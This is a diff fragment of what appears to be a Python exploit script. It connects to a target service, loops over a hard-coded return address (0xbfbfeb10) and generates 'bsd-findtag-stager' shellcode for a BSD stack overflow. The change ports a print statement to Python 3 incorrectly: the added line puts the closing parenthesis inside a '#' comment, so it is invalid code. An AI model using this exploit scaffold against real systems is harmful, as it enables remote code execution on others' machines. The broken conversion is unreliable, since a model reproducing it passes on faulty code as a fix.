@@ -33,7 +33,7 @@ TIMEOUT = 20
 for ret in range(0xbfbfeb10, 0xbfbfeb11,10):			#failed attempt at bruting...
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.getprotobyname('tcp'))
   s.connect((host,port))
-  print s.recv(65768)						#may not be necessary
+  print(s.recv(65768)						#may not be necessary)
   
   #shellcode = hl.genShell("bsd-findtag-stager",164, PREFIX='\x83\xec\x9c')
   shellcode = hl.genShell("bsd-findtag-stager",164,100)
